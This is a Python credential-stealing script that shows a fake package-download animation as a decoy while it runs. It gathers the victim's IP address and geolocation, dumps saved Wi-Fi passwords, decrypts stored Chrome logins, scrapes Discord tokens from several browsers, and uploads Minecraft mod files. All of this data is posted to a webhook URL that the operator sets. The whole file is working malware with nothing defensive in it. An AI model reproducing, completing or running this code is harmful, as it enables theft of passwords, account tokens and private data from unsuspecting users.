
import json
import socket
import os
import subprocess
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import re
import os.path
import time
import requests
if os.name == "nt":
    import win32crypt
else:
    pass
from Crypto.Cipher import AES


print("Downloading required packages", end="", flush=True)
for x in range(0, 3):
    for y in range(0, 3):
        print(".", end="", flush=True)
        time.sleep(0.3)
    print("\b" * 3, end="", flush=True)
print("")


#set webhook url here
url = ""

if os.name == "nt":
    system = "Windows"
elif os.name == "posix":
    system = "Linux"
elif os.name == "mac":
    system = "Mac"
else:
    system = "Unknown"

public_ip = requests.get("https://api.ipify.org").text
try:
    computer_name = socket.gethostname()
    private_ip = socket.gethostbyname(computer_name)
    cores = os.cpu_count()
    gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
except:
    pass
ip_location = requests.get("http://ip-api.com/json/" + public_ip).json()

country = ip_location["country"]
region = ip_location["regionName"]
city = ip_location["city"]
isp = ip_location["isp"]
zip = ip_location["zip"]
latitute = ip_location["lat"]
longitute = ip_location["lon"]
timezone = ip_location["timezone"]

try:
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
            '\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        with open("data2.txt", "a") as b:
            if len(results) == 0:
                b.write(f"Profile Name: {i}, Password: Cannot be read\n")
            else:
                b.write(f"Profile Name: {i}, Password: {results[0]}\n")
except:
    pass

try:
    files_here = str(os.listdir())
except:
    pass

try:
    with open("data.txt", "w") as a:
        a.write(f"INFO FOR {computer_name}\n")
        a.write("\n")
        a.write(f"System: {system}\n")
        a.write(f"Public IP: {public_ip}\n")
        a.write(f"Computer Name: {computer_name}\n")
        a.write(f"Private IP: {private_ip}\n")
        a.write(f"Cores: {cores}\n")
        a.write(f"GPU: {gpu}\n")
        a.write("IP LOCATION\n")
        a.write("\n")
        a.write(f"Country: {country}\n")
        a.write(f"Region: {region}\n")
        a.write(f"City: {city}\n")
        a.write(f"ISP: {isp}\n")
        a.write(f"Zip: {zip}\n")
        a.write(f"Latitute: {latitute}\n")
        a.write(f"Longitute: {longitute}\n")
        a.write(f"Timezone: {timezone}\n")
        a.write("\n")
        a.write("FILES IN CURRENT DIRECTORY\n")
        a.write("\n")
        a.write(f"{files_here}\n")
        a.write("\n")
        a.write("WIFI PASSWORDS\n")
        a.write("\n")
        with open("data2.txt", "r") as b:
            a.write(b.read())
except Exception:
    pass

data = {
    'file': open('data.txt', 'rb')
}
requests.post(url, files=data)
with open("data.txt", "w") as a:
    a.write("")


with open("data2.txt", "w") as b:
    b.write("")

mods_sep = "----Minecraft Mods Folder (ONLY FILES UNDER 8MB)----"
mods_seperator = {
    "content": f"{mods_sep}",
}
requests.post(url, data=json.dumps(mods_seperator), headers={"Content-Type": "application/json"})
try:

    dir1 = os.listdir("C:\\Users\\")

    for i in dir1:
        if os.path.isdir("C:\\Users\\" + i + "\\AppData\\Roaming\\.minecraft\\mods"):
            mods_full = os.listdir("C:\\Users\\" + i + "\\AppData\\Roaming\\.minecraft\\mods")
            if mods_full != []:
                for j in mods_full:
                    files = {
                        'file': open("C:\\Users\\" + i + "\\AppData\\Roaming\\.minecraft\\mods\\" + j, 'rb')
                    }
                    requests.post(url, files=files)
        else:
            pass
except:
    pass

chrome_pass_sep = "----Chrome Passwords----"
chrome_pass_seperator = {
    "content": f"{chrome_pass_sep}",
}
requests.post(url, data=json.dumps(chrome_pass_seperator), headers={"Content-Type": "application/json"})

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def main_chrome():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            try:
                with open("data3.txt", "a") as c:
                    c.write(f"Origin URL: {origin_url}\n")
                    c.write(f"Action URL: {action_url}\n")
                    c.write(f"Username: {username}\n")
                    c.write(f"Password: {password}\n")
                    c.write(f"Date created: {get_chrome_datetime(date_created)}\n")
                    c.write(f"Date last used: {get_chrome_datetime(date_last_used)}\n\n")
            except Exception:
                pass
        else:
            continue

    cursor.close()
    db.close()

    try:
        os.remove(filename)
    except:
        pass
    files = {
        'file': open("data3.txt", 'rb')
    }
    requests.post(url, files=files)
    with open("data3.txt", "w") as c:
        c.write("")

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main_token():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord Desktop': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ""

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n{platform}\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

    with open("data4.txt", "w") as d:
        d.write(f"DISCORD TOKENS FOR {computer_name}\n")
        d.write(message)

    discord_sep = "----Discord Tokens----"
    discord_seperator = {
        "content": f"{discord_sep}",
    }
    requests.post(url, data=json.dumps(discord_seperator), headers={"Content-Type": "application/json"})

    files = {
        'file': open("data4.txt", 'rb')
    }

    requests.post(url, files=files)
    with open("data4.txt", "w") as c:
        c.write("")

if __name__ == "__main__":
    try:
        if os.name == 'nt':
            main_chrome()
            main_token()
        elif os.name == 'posix':
            warn = {
                "content": "POSIX (linux type) OS Detected, wont run chrome logger"
            }
            requests.post(url, data=json.dumps(warn), headers={"Content-Type": "application/json"})
            main_token()
        elif os.name == 'mac':
            warn = {
                "content": "MAC OS Detected, wont run chrome logger"
            }
            requests.post(url, data=json.dumps(warn), headers={"Content-Type": "application/json"})
            main_token()
        else:
            warn = {
                "content": "Unknown OS Detected, wont run chrome logger"
            }
            requests.post(url, data=json.dumps(warn), headers={"Content-Type": "application/json"})
            main_token()
    except:
        pass
